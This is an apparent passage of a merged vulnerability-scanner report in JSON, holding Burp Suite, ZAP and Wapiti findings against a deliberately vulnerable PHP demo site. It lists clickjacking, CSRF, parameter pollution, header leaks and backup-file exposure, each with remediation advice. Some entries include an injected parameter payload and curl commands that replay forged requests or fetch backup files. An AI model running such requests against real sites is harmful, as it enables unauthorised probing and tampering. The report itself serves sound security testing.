{
    "Other": {
        "Burp Suite": [
            {
                "name": "Frameable response (potential Clickjacking)",
                "type_index": 5245344,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "firm",
                "description": "This issue was found in multiple locations under the reported path.",
                "issue_background": "<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>\n<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using \"framebusting\" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>\n<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>",
                "remediation_background": "<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>",
                "paths": [
                    "/"
                ],
                "severity": "info"
            },
            {
                "name": "HTML does not specify charset",
                "type_index": 8389120,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "No description available.",
                "issue_background": "<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>\n<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>",
                "remediation_background": "<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-8859-1</b>.\n</p>",
                "paths": [
                    "/robots.txt"
                ],
                "severity": "info"
            },
            {
                "name": "Path-relative style sheet import",
                "type_index": 2097960,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "tentative",
                "description": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold.",
                "issue_background": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\n<ol>\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\n<ul>\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
                "remediation_background": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
                "paths": [
                    "/",
                    "/AJAX/index.php",
                    "/artists.php",
                    "/cart.php",
                    "/categories.php",
                    "/disclaimer.php",
                    "/guestbook.php",
                    "/index.php",
                    "/login.php",
                    "/listproducts.php",
                    "/product.php",
                    "/signup.php",
                    "/search.php"
                ],
                "severity": "info"
            },
            {
                "name": "Input returned in response (reflected)",
                "type_index": 4197376,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "The value of the <b>artist</b> request parameter is copied into the application's response.",
                "issue_background": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
                "remediation_background": "No remediation information available.",
                "paths": [
                    "/artists.php",
                    "/AJAX/showxml.php",
                    "/guestbook.php",
                    "/hpp/",
                    "/listproducts.php",
                    "/AJAX/showxml.php",
                    "/product.php",
                    "/guestbook.php",
                    "/showimage.php",
                    "/search.php",
                    "/search.php"
                ],
                "severity": "info"
            },
            {
                "name": "User agent-dependent response",
                "type_index": 4194592,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "firm",
                "description": "No description available.",
                "issue_background": "<p>Application responses may depend systematically on the value of the User-Agent header in requests. This behavior does not itself constitute a security vulnerability, but may point towards additional attack surface within the application, which may contain vulnerabilities.</p>\n<p>This behavior often arises because applications provide different user interfaces for desktop and mobile users. Mobile interfaces have often been less thoroughly tested for vulnerabilities such as cross-site scripting, and often have simpler authentication and session handling mechanisms that may contain problems that are not present in the full interface.</p>\n<p>To review the interface provided by the alternate User-Agent header, you can configure a match/replace rule in Burp Proxy to modify the User-Agent header in all requests, and then browse the application in the normal way using your normal browser. </p>",
                "remediation_background": "No remediation information available.",
                "paths": [
                    "/robots.txt"
                ],
                "severity": "info"
            },
            {
                "name": "Cross-site request forgery",
                "type_index": 2098944,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "tentative",
                "description": "The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against unauthenticated functionality. This is unlikely to constitute a security vulnerability in its own right, however it may facilitate exploitation of other vulnerabilities affecting application users.",
                "issue_background": "<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>\n<ul>\n<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>\n<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>\n<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>",
                "remediation_background": "<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>\n<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>",
                "paths": [
                    "/search.php"
                ],
                "severity": "info"
            },
            {
                "name": "Unencrypted communications",
                "type_index": 16777728,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "No description available.",
                "issue_background": "<p>The application allows users to connect to it over unencrypted connections.  An attacker suitably positioned to view a legitimate user's network traffic could record and monitor their interactions with the application and obtain any information the user supplies. Furthermore, an attacker able to modify traffic could use the application as a platform for attacks against its users and third-party websites. Unencrypted connections have been exploited by ISPs and governments to track users, and to inject adverts and malicious JavaScript. Due to these concerns, web browser vendors are planning to visually flag unencrypted connections as hazardous.</p>\n<p>\nTo exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.\n</p>\n<p>Please note that using a mixture of encrypted and unencrypted communications is an ineffective defense against active attackers, because they can easily remove references to encrypted resources when these references are transmitted over an unencrypted connection.</p>",
                "remediation_background": "<p>Applications should use transport-level encryption (SSL/TLS) to protect all communications passing between the client and the server. The Strict-Transport-Security HTTP header should be used to ensure that clients refuse to access the server over an insecure connection.</p>",
                "paths": [
                    "/"
                ],
                "severity": "low"
            },
            {
                "name": "Password field with autocomplete enabled",
                "type_index": 5244928,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "The page contains a form with the following action URL:<ul><li>http://testphp.vulnweb.com/userinfo.php</li></ul>The form contains the following password field with autocomplete enabled:<ul><li>pass</li></ul>",
                "issue_background": "<p>Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.</p>\n<p>The stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials. </p>",
                "remediation_background": "<p>To prevent browsers from storing credentials entered into HTML forms, include the attribute <b>autocomplete=\"off\"</b> within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).</p>\n<p>Please note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.</p>",
                "paths": [
                    "/login.php",
                    "/signup.php"
                ],
                "severity": "low"
            },
            {
                "name": "Client-side HTTP parameter pollution (reflected)",
                "type_index": 5248000,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "firm",
                "description": "The value of the <b>pp</b> request parameter is copied into the response within the query string of a URL.<br><br> The payload <b>ibt&amp;xfp=1</b> was submitted in the pp parameter. This input was echoed unmodified within the \"href\" attribute of an \"a\" tag.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary query string parameters into URLs in the application's response.",
                "issue_background": "<p>Client-side HTTP parameter pollution (HPP) vulnerabilities arise when an application embeds user input in URLs in an unsafe manner.  An attacker can use this vulnerability to construct a URL that, if visited by another application user, will modify URLs within the response by inserting additional query string parameters and sometimes overriding existing ones. This may result in links and forms having unexpected side effects. For example, it may be possible to modify an invitation form using HPP so that the invitation is delivered to an unexpected recipient. </p>\n<p>The security impact of this issue depends largely on the nature of the application functionality. Even if it has no direct impact on its own, an attacker may use it in conjunction with other vulnerabilities to escalate their overall severity.</p>",
                "remediation_background": "<p>Ensure that user input is URL-encoded before it is embedded in a URL.</p>",
                "paths": [
                    "/hpp/"
                ],
                "severity": "low"
            }
        ],
        "ZAP": [
            {
                "alert": "Modern Web Application",
                "risk": "Informational",
                "confidence": "Medium",
                "description": "The application appears to be a modern web application. If you need to explore it automatically then the Ajax Spider may well be more effective than the standard one.",
                "solution": "This is an informational alert and so no changes are required.",
                "reference": "",
                "tags": [],
                "urls": [
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1"
                ]
            },
            {
                "alert": "HTTP Only Site",
                "risk": "Medium",
                "confidence": "Medium",
                "description": "The site is only served under HTTP and not HTTPS.",
                "solution": "Configure your web or application server to use SSL (https).",
                "reference": "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\nhttps://letsencrypt.org/",
                "tags": [
                    "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                    "",
                    "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels",
                    "https://cwe.mitre.org/data/definitions/311.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/"
                ]
            }
        ],
        "Wapiti": [
            {
                "method": "GET",
                "path": "/index.bak",
                "info": "Backup file http://testphp.vulnweb.com/index.bak found for http://testphp.vulnweb.com/index.php",
                "level": 1,
                "parameter": "",
                "http_request": "GET /index.bak HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/index.bak\""
            },
            {
                "method": "GET",
                "path": "/index.zip",
                "info": "Backup file http://testphp.vulnweb.com/index.zip found for http://testphp.vulnweb.com/index.php",
                "level": 1,
                "parameter": "",
                "http_request": "GET /index.zip HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/index.zip\""
            },
            {
                "method": "GET",
                "path": "/index.bak",
                "info": "Backup file http://testphp.vulnweb.com/index.bak found for http://testphp.vulnweb.com/index.php",
                "level": 1,
                "parameter": "",
                "http_request": "GET /index.bak HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/index.bak\""
            },
            {
                "method": "GET",
                "path": "/index.zip",
                "info": "Backup file http://testphp.vulnweb.com/index.zip found for http://testphp.vulnweb.com/index.php",
                "level": 1,
                "parameter": "",
                "http_request": "GET /index.zip HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/index.zip\""
            },
            {
                "method": "GET",
                "path": "/index.bak",
                "info": "Backup file http://testphp.vulnweb.com/index.bak found for http://testphp.vulnweb.com/index.php",
                "level": 1,
                "parameter": "",
                "http_request": "GET /index.bak HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/index.bak\""
            },
            {
                "method": "GET",
                "path": "/index.zip",
                "info": "Backup file http://testphp.vulnweb.com/index.zip found for http://testphp.vulnweb.com/index.php",
                "level": 1,
                "parameter": "",
                "http_request": "GET /index.zip HTTP/1.1\nHost: testphp.vulnweb.com",
                "curl_command": "curl \"http://testphp.vulnweb.com/index.zip\""
            },
            {
                "method": "POST",
                "path": "/cart.php",
                "info": "Lack of anti CSRF token",
                "level": 2,
                "parameter": "",
                "http_request": "POST /cart.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/product.php?pic=6\nContent-Type: application/x-www-form-urlencoded\n\nprice=10000&addcart=6",
                "curl_command": "curl \"http://testphp.vulnweb.com/cart.php\" -e \"http://testphp.vulnweb.com/product.php?pic=6\" -d \"price=10000&addcart=6\""
            },
            {
                "method": "POST",
                "path": "/guestbook.php",
                "info": "Lack of anti CSRF token",
                "level": 2,
                "parameter": "",
                "http_request": "POST /guestbook.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/guestbook.php\nContent-Type: application/x-www-form-urlencoded\n\nname=anonymous+user&submit=add+message&text=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/guestbook.php\" -e \"http://testphp.vulnweb.com/guestbook.php\" -d \"name=anonymous+user&submit=add+message&text=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/search.php",
                "info": "Lack of anti CSRF token",
                "level": 2,
                "parameter": "",
                "http_request": "POST /search.php?test=query HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/\nContent-Type: application/x-www-form-urlencoded\n\nsearchFor=default&goButton=go",
                "curl_command": "curl \"http://testphp.vulnweb.com/search.php?test=query\" -e \"http://testphp.vulnweb.com/\" -d \"searchFor=default&goButton=go\""
            },
            {
                "method": "POST",
                "path": "/secured/newuser.php",
                "info": "Lack of anti CSRF token",
                "level": 2,
                "parameter": "",
                "http_request": "POST /secured/newuser.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/signup.php\nContent-Type: application/x-www-form-urlencoded\n\nuuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21",
                "curl_command": "curl \"http://testphp.vulnweb.com/secured/newuser.php\" -e \"http://testphp.vulnweb.com/signup.php\" -d \"uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2021%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21\""
            },
            {
                "method": "POST",
                "path": "/userinfo.php",
                "info": "Lack of anti CSRF token",
                "level": 2,
                "parameter": "",
                "http_request": "POST /userinfo.php HTTP/1.1\nHost: testphp.vulnweb.com\nReferer: http://testphp.vulnweb.com/login.php\nContent-Type: application/x-www-form-urlencoded\n\nuname=default&pass=Letm3in_",
                "curl_command": "curl \"http://testphp.vulnweb.com/userinfo.php\" -e \"http://testphp.vulnweb.com/login.php\" -d \"uname=default&pass=Letm3in_\""
            }
        ],
        "Uncategorized": []
    },
    "Information Disclosure": {
        "Burp Suite": [
            {
                "name": "Cross-domain Referer leakage",
                "type_index": 5243904,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "The application contains the following link to another domain from URLs containing a query string:<ul><li>http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab</li></ul>This issue was found in multiple locations under the reported path.",
                "issue_background": "<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the \"Referer\" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>\n<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>\n<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>\n<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>\n<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>",
                "remediation_background": "<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties. If placing sensitive information in the URL is unavoidable, consider using the Referer-Policy HTTP header to reduce the chance of it being disclosed to third parties.\n</p>",
                "paths": [
                    "/",
                    "/",
                    "/hpp/",
                    "/"
                ],
                "severity": "info"
            },
            {
                "name": "Email addresses disclosed",
                "type_index": 6291968,
                "origin": "http://testphp.vulnweb.com",
                "confidence": "certain",
                "description": "The following email address was disclosed in the response:<ul><li>wvs@acunetix.com</li></ul>This issue was found in multiple locations under the reported path.",
                "issue_background": "<p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p>\n<p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>",
                "remediation_background": "<p>Consider removing any email addresses that are unnecessary, or replacing personal addresses with anonymous mailbox addresses (such as helpdesk@example.com).</p>\n<p>To reduce the quantity of spam sent to anonymous mailbox addresses, consider hiding the email address and instead providing a form that generates the email server-side, protected by a CAPTCHA if necessary. </p>",
                "paths": [
                    "/"
                ],
                "severity": "info"
            }
        ],
        "ZAP": [
            {
                "alert": "Server Leaks Version Information via \"Server\" HTTP Response Header Field",
                "risk": "Low",
                "confidence": "High",
                "description": "The web/application server is leaking version information via the \"Server\" HTTP response header. Access to such information may facilitate attackers identifying other vulnerabilities your web/application server is subject to.",
                "solution": "Ensure that your web server, application server, load balancer, etc. is configured to suppress the \"Server\" header or provide generic details.",
                "reference": "https://httpd.apache.org/docs/current/mod/core.html#servertokens\nhttps://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)\nhttps://www.troyhunt.com/shhh-dont-let-your-response-headers/",
                "tags": [
                    "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
                    "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server",
                    "https://cwe.mitre.org/data/definitions/497.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/sitemap.xml",
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/robots.txt",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/style.css",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/high",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/privacy.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/images/logo.gif",
                    "http://testphp.vulnweb.com/Flash/add.swf",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/images/remark.gif",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'",
                    "http://testphp.vulnweb.com/AJAX/styles.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg",
                    "http://testphp.vulnweb.com/product.php?pic=1",
                    "http://testphp.vulnweb.com/product.php?pic=7",
                    "http://testphp.vulnweb.com/product.php?pic=6",
                    "http://testphp.vulnweb.com/product.php?pic=4",
                    "http://testphp.vulnweb.com/product.php?pic=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160",
                    "http://testphp.vulnweb.com/product.php?pic=5",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html",
                    "http://testphp.vulnweb.com/secured/newuser.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=3",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/",
                    "http://testphp.vulnweb.com/listproducts.php?artist=2",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/listproducts.php?artist=1",
                    "http://testphp.vulnweb.com/secured/style.css",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160",
                    "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html"
                ]
            },
            {
                "alert": "Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s)",
                "risk": "Low",
                "confidence": "Medium",
                "description": "The web/application server is leaking information via one or more \"X-Powered-By\" HTTP response headers. Access to such information may facilitate attackers identifying other frameworks/components your web application is reliant upon and the vulnerabilities such components may be subject to.",
                "solution": "Ensure that your web server, application server, load balancer, etc. is configured to suppress \"X-Powered-By\" headers.",
                "reference": "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework\nhttps://www.troyhunt.com/2012/02/shhh-dont-let-your-response-headers.html",
                "tags": [
                    "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
                    "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework",
                    "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html",
                    "https://cwe.mitre.org/data/definitions/497.html"
                ],
                "urls": [
                    "http://testphp.vulnweb.com/",
                    "http://testphp.vulnweb.com/index.php",
                    "http://testphp.vulnweb.com/cart.php",
                    "http://testphp.vulnweb.com/artists.php",
                    "http://testphp.vulnweb.com/categories.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/",
                    "http://testphp.vulnweb.com/AJAX/index.php",
                    "http://testphp.vulnweb.com/hpp/",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/disclaimer.php",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/login.php",
                    "http://testphp.vulnweb.com/listproducts.php?cat=1",
                    "http://testphp.vulnweb.com/search.php?test=query",
                    "http://testphp.vulnweb.com/listproducts.php?cat=4",
                    "http://testphp.vulnweb.com/artists.php?artist=3",
                    "http://testphp.vulnweb.com/listproducts.php?cat=2",
                    "http://testphp.vulnweb.com/signup.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/",
                    "http://testphp.vulnweb.com/listproducts.php?cat=3",
                    "http://testphp.vulnweb.com/privacy.php",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/",
                    "http://testphp.vulnweb.com/artists.php?artist=2",
                    "http://testphp.vulnweb.com/hpp/?pp=12",
                    "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/",
                    "http://testphp.vulnweb.com/userinfo.php",
                    "http://testphp.vulnweb.com/guestbook.php",
                    "http://testphp.vulnweb.com/artists.php?artist=1",
                    "http://testphp.vulnweb.com/product.php?pic=2",
                    "http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'",
                    "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
